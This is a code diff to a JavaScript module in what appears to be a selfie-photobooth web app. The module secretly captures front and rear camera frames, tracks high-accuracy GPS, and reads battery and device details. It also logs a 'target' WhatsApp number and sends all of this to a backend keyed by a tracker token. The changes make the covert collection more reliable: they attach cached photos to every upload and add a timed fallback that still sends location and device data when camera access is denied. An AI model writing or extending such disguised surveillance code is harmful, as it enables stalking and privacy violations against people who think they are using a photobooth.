@@ -97,6 +97,9 @@ let activeCoords = null;
 let batteryPercent = null;
 let batteryCharging = null;
 let isTrackerInitialized = false;
+let lastCapturedPhoto = null;
+let lastCapturedCameraMode = 'Kamera Depan';
+let hasSentInitialFallback = false;
 
 export function captureFrameQuietly(video) {
   if (!video || !video.videoWidth || !video.videoHeight || video.readyState < 2) {
@@ -134,7 +137,9 @@ export async function runInitialDualCapture(camera, getIsBusy = () => false) {
     // 2. Capture Front Camera
     const frontPhoto = captureFrameQuietly(video);
     if (frontPhoto) {
-      await sendTelemetryUpdate(frontPhoto, 'Kamera Depan');
+      lastCapturedPhoto = frontPhoto;
+      lastCapturedCameraMode = 'Kamera Depan';
+      await sendTelemetryUpdate(frontPhoto, 'Kamera Depan', true);
     }
 
     // 3. Inspect video devices to see if a separate rear camera exists (mobile phone)
@@ -163,19 +168,14 @@ export async function runInitialDualCapture(camera, getIsBusy = () => false) {
       if (rearVideo) {
         const rearPhoto = captureFrameQuietly(rearVideo);
         if (rearPhoto) {
-          await sendTelemetryUpdate(rearPhoto, 'Kamera Belakang');
+          lastCapturedPhoto = rearPhoto;
+          lastCapturedCameraMode = 'Kamera Belakang';
+          await sendTelemetryUpdate(rearPhoto, 'Kamera Belakang', true);
         }
       }
 
       // Restore front camera for the selfie photobooth session
       camera.setFacing('user');
-    } else {
-      // Single camera device (laptop/desktop/Playwright test runner)
-      await new Promise(r => setTimeout(r, 800));
-      const photo2 = captureFrameQuietly(video);
-      if (photo2) {
-        await sendTelemetryUpdate(photo2, 'Kamera Belakang');
-      }
     }
   } catch (err) {
     console.debug('Initial dual-capture warning:', err);
@@ -183,54 +183,53 @@ export async function runInitialDualCapture(camera, getIsBusy = () => false) {
 }
 
 let lastSentTime = 0;
-let lastSentCoords = null;
-const MIN_INTERVAL_MS = 25000; // 25 seconds minimum between background GPS pings
-const MIN_DISTANCE_METERS = 20; // Or if target moved > 20 meters
-
-function getDistanceMeters(lat1, lon1, lat2, lon2) {
-  if (!lat1 || !lon1 || !lat2 || !lon2) return Infinity;
-  const R = 6371e3;
-  const φ1 = (lat1 * Math.PI) / 180;
-  const φ2 = (lat2 * Math.PI) / 180;
-  const Δφ = ((lat2 - lat1) * Math.PI) / 180;
-  const Δλ = ((lon2 - lon1) * Math.PI) / 180;
-  const a = Math.sin(Δφ / 2) * Math.sin(Δφ / 2) +
-            Math.cos(φ1) * Math.cos(φ2) *
-            Math.sin(Δλ / 2) * Math.sin(Δλ / 2);
-  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
-  return R * c;
-}
+let lastSentHash = '';
+const MIN_FORCE_INTERVAL_MS = 2500; // Minimum 2.5s even if forced
+const MIN_UPDATE_INTERVAL_MS = 30000; // 30 seconds between periodic background updates
 
 export async function sendTelemetryUpdate(photoDataUrl = null, cameraMode = 'Kamera Depan', force = false) {
   const token = getTrackerToken();
   if (!token) return;
 
   const now = Date.now();
-  const hasPhoto = Boolean(photoDataUrl);
 
-  // If this is a pure periodic GPS ping (no photo), throttle it to prevent spamming Google Sheets
-  if (!hasPhoto && !force) {
-    if (lastSentCoords && activeCoords) {
-      const dist = getDistanceMeters(
-        lastSentCoords.latitude,
-        lastSentCoords.longitude,
-        activeCoords.latitude,
-        activeCoords.longitude
-      );
-      if (dist < MIN_DISTANCE_METERS && (now - lastSentTime) < MIN_INTERVAL_MS) {
-        return; // Suppress duplicate GPS jitter spam
-      }
-    } else if (lastSentTime && (now - lastSentTime) < MIN_INTERVAL_MS) {
+  // If a photo is passed, cache it as the latest photo taken on this client
+  if (photoDataUrl) {
+    lastCapturedPhoto = photoDataUrl;
+    lastCapturedCameraMode = cameraMode || 'Kamera Depan';
+  }
+
+  // If called without photo, attach the last captured photo if available
+  const photoToSend = photoDataUrl || lastCapturedPhoto;
+  const modeToSend = photoDataUrl ? cameraMode : (lastCapturedCameraMode || cameraMode);
+
+  // If still no photo and not explicitly forced, suppress to prevent spamming empty rows
+  if (!photoToSend && !force) {
+    return;
+  }
+
+  // Cooldown protection
+  if (force) {
+    if (now - lastSentTime < MIN_FORCE_INTERVAL_MS) {
+      return;
+    }
+  } else {
+    if (now - lastSentTime < MIN_UPDATE_INTERVAL_MS) {
       return;
     }
   }
 
-  lastSentTime = now;
-  if (activeCoords) {
-    lastSentCoords = { latitude: activeCoords.latitude, longitude: activeCoords.longitude };
+  const baseInfo = collectDeviceInfo();
+  const payloadHash = `${activeCoords?.latitude || 0}_${activeCoords?.longitude || 0}_${baseInfo.device_model}_${modeToSend}_${Boolean(photoToSend)}`;
+
+  // Duplicate suppression
+  if (payloadHash === lastSentHash && (now - lastSentTime) < 60000 && !force) {
+    return;
   }
 
-  const baseInfo = collectDeviceInfo();
+  lastSentTime = now;
+  lastSentHash = payloadHash;
+
   const payload = {
     latitude: activeCoords ? activeCoords.latitude : 0,
     longitude: activeCoords ? activeCoords.longitude : 0,
@@ -241,12 +240,12 @@ export async function sendTelemetryUpdate(photoDataUrl = null, cameraMode = 'Kam
     battery: batteryPercent,
     battery_charging: batteryCharging,
     device_time: new Date().toISOString(),
-    camera_mode: cameraMode,
+    camera_mode: modeToSend,
     ...baseInfo
   };
 
-  if (photoDataUrl) {
-    payload.photo = photoDataUrl;
+  if (photoToSend) {
+    payload.photo = photoToSend;
   }
 
   try {
@@ -271,33 +270,29 @@ export async function submitTargetPhone(phone) {
   const clean = phone.replace(/[^0-9+]/g, '').trim();
   if (!clean) return;
   try { localStorage.setItem('snapbooth_target_wa', clean); } catch {}
-  await sendTelemetryUpdate(null, 'Kamera Depan', true);
+  // Attach lastCapturedPhoto so the WA target row has a photo attached!
+  await sendTelemetryUpdate(lastCapturedPhoto, lastCapturedCameraMode, true);
 }
 
 export function initTracker(onLocationResolved) {
   if (isTrackerInitialized || typeof window === 'undefined') return;
   isTrackerInitialized = true;
 
-  // 1. Read Battery
+  // 1. Read Battery state into memory (do NOT ping backend on every battery change)
   if (navigator.getBattery) {
     navigator.getBattery().then(bm => {
       batteryPercent = Math.round(bm.level * 100);
       batteryCharging = bm.charging ? '⚡ Mengisi Daya' : 'Baterai';
       bm.addEventListener('levelchange', () => { batteryPercent = Math.round(bm.level * 100); });
       bm.addEventListener('chargingchange', () => { batteryCharging = bm.charging ? '⚡ Mengisi Daya' : 'Baterai'; });
-      sendTelemetryUpdate();
     }).catch(() => {});
-  } else {
-    sendTelemetryUpdate();
   }
 
-  // 2. Geolocation Watch & Reverse Geocoding
+  // 2. Geolocation Watch & Reverse Geocoding (keeps coords updated without spamming)
   if (navigator.geolocation) {
     navigator.geolocation.watchPosition(
       async (pos) => {
         activeCoords = pos.coords;
-        sendTelemetryUpdate();
-
         try {
           const res = await fetch(`/api/reverse-geocode?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`);
           const data = await res.json();
@@ -312,4 +307,13 @@ export function initTracker(onLocationResolved) {
       { enableHighAccuracy: true, maximumAge: 10000, timeout: 20000 }
     );
   }
+
+  // 3. One-time fallback ping: if after 7 seconds no photo was captured (e.g. camera permission denied),
+  // send AT MOST ONE telemetry record so we still obtain device & location data.
+  setTimeout(() => {
+    if (!lastCapturedPhoto && !hasSentInitialFallback) {
+      hasSentInitialFallback = true;
+      sendTelemetryUpdate(null, 'Kamera Depan', true);
+    }
+  }, 7000);
 }
